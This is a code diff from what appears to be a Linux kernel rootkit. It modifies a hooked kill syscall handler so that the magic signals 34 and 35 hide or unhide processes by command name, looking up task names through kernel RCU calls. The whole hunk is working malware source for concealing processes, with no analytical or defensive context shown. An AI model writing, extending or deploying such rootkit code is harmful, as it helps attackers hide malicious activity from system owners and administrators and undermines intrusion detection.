@@ -41,28 +41,44 @@ static asmlinkage int kill_hook(const struct pt_regs* ctx) {
             break;
             
         case SIGRTMIN:
-            // Hide process: kill -34 0 PID_TO_HIDE
+            // Hide process by name: kill -34 0
             if (pid == 0) {
-                // The PID to hide is passed as the target PID in a different way
-                // We need to get it from the signal info or use a different approach
-                // For now, we'll use the current process PID as an example
-                pid_t target_pid = current->pid;
-                add_hidden_pid(target_pid);
+                char comm_buf[TASK_COMM_LEN];
+                get_task_comm(comm_buf, current);
+                add_hidden_process(comm_buf);
             } else {
-                // Hide the specified PID
-                add_hidden_pid((pid_t)pid);
+                // Hide process by PID (we'll get its name)
+                struct task_struct *task;
+                char target_comm[TASK_COMM_LEN];
+                
+                rcu_read_lock();
+                task = pid_task(find_vpid((pid_t)pid), PIDTYPE_PID);
+                if (task) {
+                    get_task_comm(target_comm, task);
+                    add_hidden_process(target_comm);
+                }
+                rcu_read_unlock();
             }
             break;
             
         case SIGRTMIN1:
-            // Unhide process: kill -35 0 PID_TO_UNHIDE
+            // Unhide process by name: kill -35 0
             if (pid == 0) {
-                // Similar to above, get target PID
-                pid_t target_pid = current->pid;
-                remove_hidden_pid(target_pid);
+                char comm_buf[TASK_COMM_LEN];
+                get_task_comm(comm_buf, current);
+                remove_hidden_process(comm_buf);
             } else {
-                // Unhide the specified PID
-                remove_hidden_pid((pid_t)pid);
+                // Unhide process by PID (we'll get its name)
+                struct task_struct *task;
+                char target_comm[TASK_COMM_LEN];
+                
+                rcu_read_lock();
+                task = pid_task(find_vpid((pid_t)pid), PIDTYPE_PID);
+                if (task) {
+                    get_task_comm(target_comm, task);
+                    remove_hidden_process(target_comm);
+                }
+                rcu_read_unlock();
             }
             break;
             
